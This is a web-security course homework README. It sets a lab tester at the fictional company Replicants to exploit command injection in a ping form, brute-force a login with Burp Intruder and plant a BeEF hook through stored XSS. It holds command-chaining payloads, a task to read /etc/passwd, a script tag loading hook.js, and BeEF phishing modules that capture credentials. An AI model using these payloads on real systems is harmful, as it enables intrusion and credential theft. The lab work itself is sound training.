# Web-Vulnerabilities-and-Hardening

Overview
In this homework scenario, you will continue as an application security engineer at Replicants. Replicants created several new web applications and would like you to continue testing them for vulnerabilities. Additionally, your manager would like you to research and test a security tool called BeEF in order to understand the impact it could have on the organization if Replicants was targeted with this tool.

Lab Environment
You will continue to use your Vagrant virtual machine for this assignment.

Topics Covered in Your Assignment
Web application vulnerability assessments
Injection
Brute force attacks
Broken authentication
Burp Suite
Web proxies
Directory traversal
Dot dot slash attacks
Beef
Cross-site scripting
Malicious payloads
Instructions
In this assignment, you will test three web application vulnerabilities. For each vulnerability you will be provided with the following:

Steps detailing how to setup and access the application.

A walkthrough explaining how the application is intended to work.

A task that will test the application for vulnerabilities.

Your goal is to determine if the application is vulnerable and provide mitigations.

Submission Guidelines
You will submit a document (Word or Google Docs) that contains the following for each web application:

Screen shots confirming the successful exploit.

Two to three sentences detailing recommended mitigation strategies.

When complete, submit the file on BCS.

Web Application 1: Your Wish is My Command Injection
Complete the following to set up the activity.

Access Vagrant and open a browser.

Navigate to the following webpage: http://192.168.13.25 and select the Command Injection option.

Alternatively, access the webpage directly at this page: http://192.168.13.25/vulnerabilities/exec/

The web page should look like the following:

wd_hw1

Note: If you have any issues accessing this webpage, refer to the Activity Setup steps we completed in the activity 06_SQL_Injection on Day 1 of this unit.

Click here to view the set up instructions.
This page is a new web application built by Replicants in order to enable their customers to ping an IP address. The web page will return the results of the ping command back to the user.

Complete the following steps to walkthrough the intended purpose of the web application.

Test the webpage by entering the IP address 8.8.8.8. Press Submit to see the results display on the web application.

wd_hw2

Behind the scenes, when you select Submit, the IP you type in the field is injected into a command that is run against the Replicants webserver. The specific command that ran on the webserver is ping <IP> and 8.8.8.8 is the field value that is injected into that command.

This process is no different than if we went to the command line and typed that same command: ping 8.8.8.8

wd_hw3

Test if we can manipulate the input to cause an unintended result.

On the same webpage, enter the following command (payload) in the field: 8.8.8.8 && pwd

This command uses two ampersands to add a second command to the original request:

pwd is the second command. It will display the directory location where the command is run on the Replicants webserver.

This would be no different than running ping 8.8.8.8 && pwd on the command line.

Press Enter. Note the ping results are the results of the second pwd command:

wd_hw4

This type of injection attack is called Command Injection, and it is dependent on the web application taking user input to run a command against an operating system.

Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:

/etc/passwd

/etc/hosts

Hint: Try testing out a command directly on the command line to help design your payload.

Deliverable: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies.

Web Application 2: A Brute Force to Be Reckoned With
Complete the following steps to set up the activity.

Open a browser on Vagrant and navigate to the webpage http://192.168.13.35/install.php.

The page should look like the following:

wd_hw5

Click "here" to install bWapp. (See the arrow in the previous screenshot.)

After successfully installing bWapp, use the following credentials to login.

Login: bee

Password: bug

wd_hw6

This will take you to the following page:

wd_hw7

To access the application where we will perform our activity, enter in the following URL: http://192.168.13.35/ba_insecure_login_1.php

This will take you to the following page:

wd_hw8

This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects Login.

If the user/password combination is correct, it will return a successful message.

If the user/password combination is incorrect, it will return the message, "Invalid credentials."

Years ago, Replicants had a systems breach and several administrators passwords were stolen by a malicious hacker. The malicious hacker was only able to capture a list of passwords, not the associated accounts' usernames. Your manager is concerned that one of the administrators that accesses this new web application is using one of these compromised passwords. Therefore, there is a risk that the malicious hacker can use these passwords to access an administrator's account and view confidential data.

Use the web application tool Burp Suite, specifically the Burp Suite Intruder feature, to determine if any of the administrator accounts are vulnerable to a brute force attack on this web application.

You've been provided with a list of administrators and the breached passwords:

List of Administrators

Breached list of Passwords

Hint: Refer back to the Burp Intruder activity 10_Brute_Force from Day 3 for guidance.

Deliverable: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies.

Web Application 3: Where's the BeEF?
Complete the following to start the activity.

To access the BeEF graphic user interface (GUI), open your browser and enter the following URL, http://127.0.0.1:3000/ui/panel.

When the BeEF webpage opens, log in with the following credentials:

Username: beef
Password: feeb
wd_hw11

You have successfully completed the setup when you have reached the BeEF Control Panel shown in the image below:

wd_hw12

The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.

While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.

An attacker takes a small snippet of code, called a BeEF Hook, and determines a way to add this code into a target website. This is commonly done by cross-site scripting.

When subsequent users access the infected website, the users' browsers become hooked.

Once a browser is hooked, it is referred to as a zombie. A zombie is an infected browser that awaits instructions from the BeEF control panel.
The BeEF control panel has hundreds of exploits that can be launch against the hooked victims, including:
Social engineering attacks
Stealing confidential data from the victim's machine
Accessing system and network information from the victim's machine
BeEF includes a feature to test out a simulation of an infected website.

To access this simulated infected website, locate the following sentence on the BeEF control panel: To begin with, you can point a browser towards the basic demo page here, or the advanced version here.

Click the second "here" to access the advanced version.

wd_hw13

This will open the following website, which has been infected with a BeEF hook.

wd_hw14

Note that once you have pulled up this infected webpage, your browser has now been hooked!

If your browser has not been hooked, restart your browser and try again.
Return to the control panel. On the left side, you can notice that your browser has become infected since accessing the infected Butcher website. Note that if multiple browsers become infected they will all be listed individually on the left hand side of this panel.

Click on the browser 127.0.0.1 as indicated in the screenshot below.

wd_hw15

Under the Details tab, we can see information about the infected browser.

Now we are ready to test an exploit.

Select the Commands tabs.

This will list folders of hundreds of exploits that can be ran against the hooked browser. Note that many may not work, as they are dependent on the browser and security settings enabled.
First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.

To access this exploit, select Google Phishing under Social Engineering.

wd_hw16

After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.

wd_hw17

To launch the exploit, select Execute in the bottom right corner.

After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.

A victim could easily mistake this for a real login prompt.

Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page.

Username: hackeruser

Password: hackerpass

wd_hw18

Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.

wd_hw19

Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.

Task details:

The page you will test is the Replicants Stored XSS application which was used the first day of this unit: http://192.168.13.25/vulnerabilities/xss_s/
The BeEF hook, which was returned after running the sudo beef command was: http://127.0.0.1:3000/hook.js
The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>
When you attempt to inject this payload, you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.

Hint: Try right-clicking and selecting "Inspecting the Element".
Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:

Social Engineering >> Pretty Theft

Social Engineering >> Fake Notification Bar

Host >> Get Geolocation (Third Party)
